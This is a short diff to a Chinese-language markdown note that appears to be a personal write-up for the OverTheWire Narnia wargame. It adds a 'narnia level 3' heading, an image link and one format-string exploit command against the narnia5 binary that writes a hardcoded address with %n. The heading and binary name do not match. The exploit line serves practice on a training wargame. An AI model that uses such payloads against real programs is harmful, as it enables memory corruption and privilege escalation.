@@ -64,3 +64,11 @@ copy 可执行文件到tmp，确保文件名长度一致
 
 ![image-20210816221326719](img/image-20210816221326719.png)
 
+# 2. narnia level 3
+
+![image-20210822210025905](/Users/wanghui/workspace/git_repos/hack_my_life/over_the_wire/narnia/img/image-20210822210025905.png)
+
+
+
+
+/narnia/narnia5 $(echo -e "\x90\xd6\xff\xff")%496x%1\$n
